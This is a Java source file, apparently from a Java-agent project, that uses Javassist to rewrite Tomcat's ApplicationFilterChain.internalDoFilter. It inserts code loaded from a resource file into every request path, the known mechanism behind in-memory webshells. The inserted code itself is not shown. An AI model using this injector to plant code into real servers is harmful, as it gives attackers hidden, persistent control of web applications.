package priv.ga0weI.baseonagent;

import javassist.*;

import java.io.*;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class Transformerthings implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (className.equals("org/apache/catalina/core/ApplicationFilterChain")){ //这里  xxx/xxx/xxx/xxx
            try {
//                System.out.println("当前的类是："+className);
//                System.out.println("a request com and hook the ApplicationFilterChain");
                ClassPool classPool = ClassPool.getDefault();
//                System.out.println("classBeingRedefinefined is :"+classBeingRedefined.getName());// classBeingRedefined = null
                ClassClassPath classPath = new ClassClassPath(className.getClass());  //get className class's classpath
//                System.out.println("this class path :"+classPath.toString())    ;
                classPool.insertClassPath(classPath);  //add the classpath to classpool  To nextfind
//                System.out.println("classPool has :"+classPool.toString());
                CtClass ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");  //这里 xx.xx.xx
                CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");

                ctMethod.addLocalVariable("elapsedTime", CtClass.longType);
                ctMethod.insertBefore(readSource());

                byte [] classbytes =ctClass.toBytecode();
                /*
                try get fileclass
                 */
                FileOutputStream fos =new FileOutputStream("retransformed.class");
                fos.write(classbytes);
//                System.out.println("retransformer 修改之后的字节文件还原为retransformed.class");
                ctClass.detach();
//                System.out.println("success injected");
                return classbytes;

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return  classfileBuffer;
//        return new byte[0];
    }
    /*
    import bytecode we want
     */
    private String readSource() {
        StringBuilder source=new StringBuilder();
        InputStream is = Transformerthings.class.getClassLoader().getResourceAsStream("source.txt");
        InputStreamReader isr = new InputStreamReader(is);
        String line=null;
        try {
            BufferedReader br = new BufferedReader(isr);
            while((line=br.readLine()) != null) {
                source.append(line);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return source.toString();
    }
}
